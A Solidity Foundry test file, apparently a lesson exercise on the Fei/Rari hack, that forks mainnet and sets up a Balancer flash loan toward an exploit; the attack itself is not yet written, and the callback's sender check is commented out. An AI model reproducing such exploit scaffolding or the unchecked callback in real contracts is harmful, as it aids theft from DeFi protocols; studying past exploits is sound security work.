// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Lesson 3 - FeiRari.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract FeiRariExploit is Test {
    BalancerInterface public balancerFlashLoanContract;
    WethInterface public weth;

    function setUp() public {
        vm.startPrank(address(0x7));
        vm.rollFork(14684371);

        balancerFlashLoanContract = BalancerInterface(payable(0xBA12222222228d8Ba445958a75a0704d566BF2C8));
        weth = WethInterface(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    }

    function testExploitRari() public {
        // console.log("hey");

        vm.deal(address(0x7), 10000 ether);
        weth.deposit{value: 10000 ether}();
        weth.approve(address(this), 1000 ether);


        address[] memory path = new address[](1);
        path[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1 ether;
        bytes memory userData = "";
        console.log("hey!!!", address(this));
        balancerFlashLoanContract.flashLoan(0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, path, amounts, userData);
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external  {
        // require(msg.sender == 0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        console.log("Received!");
        weth.transferFrom(address(0x7), msg.sender, 2 ether);
    }
}
